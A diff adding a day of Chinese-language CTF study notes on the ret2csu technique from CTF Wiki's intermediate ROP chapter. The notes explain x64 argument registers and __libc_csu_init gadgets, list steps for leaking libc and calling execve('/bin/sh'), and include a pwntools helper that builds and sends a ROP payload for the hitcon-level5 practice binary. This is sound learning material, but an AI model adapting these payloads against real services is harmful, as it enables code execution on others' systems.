@@ -50,6 +50,62 @@
             5. 利用思路就是 => 构造ROP链通过`puts`泄露`__libc_start_main`的got地址 => 使用`LibcSearcher`获取libc的基址从而获取`system`地址和`/bin/sh`地址 => 重载程序 => 构造payload控制.
 </details>
 
+<details>
+<summary>Day2: 学习CTF Wiki中高级ROP</summary>
+
+> 传送门: [CTF Wiki: Linux Pwn](https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/)
+
+- [x] [Intermediate ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/):
+    - [x] [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#_1):
+        * x64寄存器传参的顺序为`rdi, rsi, rdx, rcx, r8, r9`, 超出数量的参数根据函数调用约定压入栈中(比如从右向左压栈)
+        * `__libc_csu_init`是`__libc_start_main`调用的用于初始化的函数. 参考: [Linux X86 程序启动–main函数是如何被执行的？](https://luomuxiaoxiao.com/?p=516)
+        * 示例的level5应是[ctf-challenges](https://github.com/ctf-wiki/ctf-challenges)里的[hitcon-level5](https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5), 而非蒸米提供的[level5](https://github.com/zhengmin1989/ROP_STEP_BY_STEP/tree/master/linux_x64)
+        * 使用`ROPgadget`搜索可用的gadget是可以发现, 程序并没有直接的控制传参用的寄存器, 大多都是控制`r12-r15`, 这也就是分析`__libc_csu_init`的关键: 我们需要其中的`mov`语句, 通过`r13-r15`控制x64传参用的前三个寄存器.
+        * 分析`__libc_csu_init`的目的是掌握可控制的寄存器, 也就是能控制`rbx, rbp, r12, r13=>rdx, r14=>rsi, r15=>edi`, 同时可控的`r12`和`rbx`以及`call qword ptr [r12+rbx*8]`能控制调用的函数地址(`r12`为函数地址, `rbx`直接为0). `add rbx, 1; cmp rbx, rbp; jnz 400600`则是约束条件`rbx+1==rbp`, 故而`rbx=0则rbp=1`. 这样来看这是一段非常优雅的`gadget`. 
+        * `write (fd, &buf, count)`中, linux下`fd=0/1/2`分别对应`stdin/stdout/stderr`. 
+        1. libc延迟绑定机制, 因此需要等待`write`输出`Hello, World`后泄露函数地址. 
+        2. 泄露函数地址后获取libc基址, 然后获取`execve`地址
+        3. 利用csu执行`read()`向bss段写入`execve`地址和参数`/bin/sh`
+        4. 利用csu执行`execve(/bin/sh)`
+        <details>
+        <summary>csu函数实现</summary>
+        
+        ``` python
+        def csu(func_addr, arg3, arg2, arg1, ret_addr):
+           rbx = 0
+           rbp = 1
+           r12 = func_addr
+           r13 = arg3
+           r14 = arg2
+           r15 = arg1
+        
+           # pop rbx rbp r12 r13 r14 r15 retn
+           csu_pop_gadget = 0x000000000040061A
+
+           # r13=>rdx r14=>rsi r15=>edi 
+           # call func
+           # rbx+1 == rbp
+           # add rsp, 8
+           # csu_pop_gadget
+           csu_mov_gadget = 0x0000000000400600
+
+           # pop 6 registers and `add rsp, 8`
+           stack_balance = b'\x90' * 0x8 * (6+1)
+
+           payload = flat([
+               b'\x90'*0x80, b'fake_rbp', p64(csu_pop_gadget),
+               p64(rbx), p64(rbp), p64(r12), p64(r13), p64(r14), p64(r15),
+               p64(csu_mov_gadget), stack_balance, p64(ret_addr)
+           ])
+
+           io.send(payload)
+           sleep(1)
+        ```
+        </details>
+
+</details>
+
+
 ## 相关资源
 
 * [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/): 起初是X-Man夏令营的几位学员, 由[iromise](https://github.com/iromise)和[40huo](https://github.com/40huo)带头编写的CTF知识维基站点. 我早先学习参与CTF竞赛的时候, CTF一直没有一个系统全面的知识索引. [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/)的出现能很好地帮助初学者们渡过入门的那道坎. 我也有幸主要编写了Wiki的Reverse篇. 
